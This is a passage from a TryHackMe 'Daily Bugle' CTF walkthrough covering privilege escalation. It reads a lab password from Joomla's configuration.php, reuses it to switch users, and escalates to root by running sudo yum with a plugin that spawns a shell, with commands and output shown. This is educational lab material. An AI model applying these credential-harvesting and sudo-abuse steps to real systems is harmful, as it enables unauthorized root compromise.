---
sidebar_position: 2
title: Daily Bugle
sidebar_label: Exploitation
description: Daily Bugle TryHackMe
keywords: [daily bugle, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, joomla, joomla exploit, john, CVE-2017-8917, privilege escalation, yum privilege escalation]
---

## Privilege Escalation

- **We can catch the Reverse Shell Using `netcat`** 

```bash
apache@dailybugle /$  id
uid=48(apache) gid=48(apache) groups=48(apache)
```

<br/>

- Enumerating through Various Files we Found the **`Password`** for one of the **Users** on the **System**: <b style={{ color: 'Chartreuse' }}>jjameson</b>
- **File Location: `/var/www/html/configuration.php`**
- **Password:** <b style={{ color: 'Coral' }}>nv5uz9r3ZEDzVjNu</b>

```php
class JConfig {
	public $user = 'jjameson';
	public $password = 'nv5uz9r3ZEDzVjNu';
}
```

<br/>

- **Using the Found Credentials to Switch User:** <b style={{ color: 'Chartreuse' }}>jjameson</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>nv5uz9r3ZEDzVjNu</b> 
- **The User `jjameson` can run:** <b style={{ color: 'Plum' }}>/usr/bin/yum</b> <span style={{fontWeight: 'Bold'}}>as</span> <b style={{ color: 'Red' }}>ROOT</b> 

```bash
[jjameson@dailybugle ~]$ id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

<br/>

- Using <b style={{ color: 'Plum' }}>/usr/bin/yum</b> to Escalate Privileges.

```bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
```

```bash
[root@dailybugle ~]$ id
uid=0(root) gid=0(root) groups=0(root)
```
---